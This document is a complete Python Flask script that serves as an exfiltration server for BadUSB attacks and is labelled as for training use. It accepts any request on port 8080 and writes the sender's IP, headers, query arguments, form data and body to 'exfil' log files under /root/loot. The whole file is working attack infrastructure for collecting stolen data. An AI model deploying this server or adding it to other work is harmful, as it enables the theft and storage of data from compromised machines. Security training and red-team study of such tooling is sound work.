#!/usr/bin/env python3
"""
Simple Exfiltration Server
Receives and logs data from BadUSB payloads

For training purposes only
"""

from flask import Flask, request
from datetime import datetime
import json
import os

app = Flask(__name__)

LOG_DIR = "/root/loot"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route("/", methods=["GET", "POST"])
@app.route("/<path:path>", methods=["GET", "POST"])
def catch_all(path=""):
    """Catch all requests and log them"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    log_entry = {
        "timestamp": timestamp,
        "source_ip": request.remote_addr,
        "method": request.method,
        "path": f"/{path}",
        "headers": dict(request.headers),
        "args": request.args.to_dict(),
        "form": request.form.to_dict(),
        "data": request.data.decode("utf-8", errors="ignore")
    }

    # Print to console
    print(f"\n{'='*60}")
    print(f"[{timestamp}] {request.method} /{path}")
    print(f"Source: {request.remote_addr}")

    if request.args:
        print(f"Args: {request.args.to_dict()}")
    if request.form:
        print(f"Form: {request.form.to_dict()}")
    if request.data:
        print(f"Data: {request.data.decode('utf-8', errors='ignore')[:500]}")

    # Log to file
    log_file = os.path.join(LOG_DIR, f"exfil_{datetime.now().strftime('%Y%m%d')}.log")
    with open(log_file, "a") as f:
        f.write(json.dumps(log_entry) + "\n")

    return "OK"

if __name__ == "__main__":
    print("=" * 60)
    print("Exfiltration Server - Training Use Only")
    print("=" * 60)
    print(f"Logging to: {LOG_DIR}")
    print("All requests will be logged")
    print("=" * 60)

    app.run(host="0.0.0.0", port=8080)
